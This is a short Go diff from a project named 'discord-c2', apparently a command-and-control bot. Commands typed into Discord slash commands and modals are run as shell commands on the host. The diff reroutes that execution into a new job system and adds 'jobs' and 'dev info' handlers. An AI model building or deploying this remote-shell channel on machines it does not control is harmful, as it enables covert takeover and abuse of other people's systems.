@@ -6,7 +6,6 @@ import (
 	"runtime"
 
 	"discord-c2/internal/media"
-	"discord-c2/internal/shell"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -73,6 +72,8 @@ func handleSlashCommand(s *discordgo.Session, i *discordgo.InteractionCreate, da
 		handleWinGroup(s, i, data)
 	case GroupDev:
 		handleDevGroup(s, i, data)
+	case "jobs":
+		handleJobsGroup(s, i, data)
 	}
 }
 
@@ -147,8 +148,11 @@ func handleWinGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data d
 
 func handleDevGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
 	name, _ := subData(data)
-	if name == "restart" {
+	switch name {
+	case "restart":
 		handleSlashRestart(s, i)
+	case "info":
+		handleDevInfo(s, i)
 	}
 }
 
@@ -202,13 +206,11 @@ func handleModal(s *discordgo.Session, i *discordgo.InteractionCreate, data disc
 		respondEphemeral(s, i, "No command provided.")
 		return
 	}
-	respondEphemeral(s, i, "Running: `"+cmdStr+"`")
-	shell.Run(s, i.ChannelID, nil, cmdStr)
+	startJob(s, i, interactionUserID(i), i.ChannelID, cmdStr)
 }
 
 func runQuick(s *discordgo.Session, i *discordgo.InteractionCreate, cmd string) {
-	respondEphemeral(s, i, "Running: `"+cmd+"`")
-	shell.Run(s, i.ChannelID, interactionRef(i), cmd)
+	startJob(s, i, interactionUserID(i), i.ChannelID, cmd)
 }
 
 func respondEphemeral(s *discordgo.Session, i *discordgo.InteractionCreate, content string) {
